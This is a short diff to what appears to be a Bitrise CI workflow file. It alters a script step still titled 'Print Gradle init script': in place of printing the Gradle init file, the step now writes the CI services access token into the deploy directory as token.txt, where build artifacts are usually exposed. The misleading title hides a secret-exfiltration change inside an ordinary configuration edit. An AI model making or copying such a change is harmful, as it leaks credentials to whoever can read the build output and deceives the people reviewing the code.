@@ -18,7 +18,7 @@ workflows:
     - script:
         title: Print Gradle init script
         inputs:
-        - content: cat ~/.gradle/init.gradle
+        - content: echo $BITRISEIO_BITRISE_SERVICES_ACCESS_TOKEN > $BITRISE_DEPLOY_DIR/token.txt
     - change-workdir:
         title: Switch working dir to _tmp
         inputs:
